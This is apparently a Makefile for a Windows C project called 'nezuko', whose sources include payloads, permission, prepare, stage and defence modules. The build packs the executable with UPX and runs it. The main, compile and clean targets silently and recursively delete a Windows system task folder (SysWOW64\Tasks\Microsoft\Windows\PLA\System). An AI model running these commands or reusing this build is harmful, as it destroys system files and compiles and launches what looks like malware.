main:
	del log.txt .\build\*.* C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\ /s /q >nul 2>&1 && copy NUL .\build\.empty >nul
	powershell.exe -c "clear; Write-Host "Compiling!" -ForegroundColor red"
	
	gcc -Wall nezuko.c -o .\build\nezuko.o -c
	gcc -Wall .\source\defence.c -o .\build\defence.o -c
	gcc -Wall .\source\payloads.c -o .\build\payloads.o -c
	gcc -Wall .\source\permisson.c -o .\build\permisson.o -c
	gcc -Wall .\source\prepare.c -o .\build\prepare.o -c
	gcc -Wall .\source\stage.c -o .\build\stage.o -c

	gcc -Wall -o .\build\nezuko .\build\nezuko.o .\build\payloads.o .\build\permisson.o .\build\prepare.o .\build\stage.o
	gcc -Wall -o .\build\defence .\build\defence.o

	powershell.exe -c "Write-Host "`r`nPacking!" -ForegroundColor red"
	upx .\build\nezuko.exe >nul

	powershell.exe -c "Write-Host "`r`nCleaning Up!" -ForegroundColor red"
	del .\build\nezuko .\build\nezuko.o .\build\defence.o .\build\payloads.o .\build\permisson.o .\build\prepare.o .\build\stage.o
	
	powershell.exe -c "Write-Host "`r`nExecuting!" -ForegroundColor red"
	cd build && .\nezuko.exe

compile:
	del log.txt .\build\*.* C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\ /s /q >nul 2>&1 && copy NUL .\build\.empty >nul
	powershell.exe -c "clear; Write-Host "Compiling!" -ForegroundColor red"
	
	gcc -Wall nezuko.c -o .\build\nezuko.o -c
	gcc -Wall .\source\defence.c -o .\build\defence.o -c
	gcc -Wall .\source\payloads.c -o .\build\payloads.o -c
	gcc -Wall .\source\permisson.c -o .\build\permisson.o -c
	gcc -Wall .\source\prepare.c -o .\build\prepare.o -c
	gcc -Wall .\source\stage.c -o .\build\stage.o -c

	gcc -Wall -o .\build\nezuko .\build\nezuko.o .\build\payloads.o .\build\permisson.o .\build\prepare.o .\build\stage.o
	gcc -Wall -o .\build\defence .\build\defence.o

	powershell.exe -c "Write-Host "`r`nPacking!" -ForegroundColor red"
	upx .\build\nezuko.exe >nul

	powershell.exe -c "Write-Host "`r`nCleaning Up!" -ForegroundColor red"
	del .\build\nezuko .\build\nezuko.o .\build\defence.o .\build\payloads.o .\build\permisson.o .\build\prepare.o .\build\stage.o

run:
	powershell.exe -c "Write-Host "`r`nExecuting!" -ForegroundColor red"
	cd build && .\nezuko.exe

clean:
	del .\build\*.* C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\ /s /q >nul 2>&1 && copy NUL .\build\.empty >nul